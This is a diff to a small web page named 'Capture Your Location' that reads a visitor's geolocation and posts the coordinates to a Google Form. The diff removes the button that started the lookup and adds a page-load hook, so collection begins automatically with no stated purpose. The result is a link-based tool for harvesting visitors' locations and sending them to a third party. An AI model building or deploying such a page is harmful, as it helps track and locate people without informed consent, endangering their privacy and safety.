@@ -5,10 +5,10 @@
 </head>
 <body>
   <h1>Capture Your Location</h1>
-  <button onclick="getLocation()">Get Location</button>
   <p id="status"></p>
   <p id="location"></p>
   <script>
+    // Function to capture location data
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -17,6 +17,7 @@
       }
     }
 
+    // Function to handle the position data
     function showPosition(position) {
       var lat = position.coords.latitude;
       var lon = position.coords.longitude;
@@ -26,6 +27,7 @@
       sendLocationToForm(lat, lon);
     }
 
+    // Function to handle errors
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
@@ -43,6 +45,7 @@
       }
     }
 
+    // Function to send location data to Google Form
     function sendLocationToForm(lat, lon) {
       var formUrl = "YOUR_GOOGLE_FORM_URL"; // Replace with your Google Form URL
       var formData = {
@@ -55,6 +58,9 @@
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send(Object.keys(formData).map(key => `${key}=${encodeURIComponent(formData[key])}`).join('&'));
     }
+
+    // Automatically get the location when the page loads
+    window.onload = getLocation;
   </script>
 </body>
 </html>
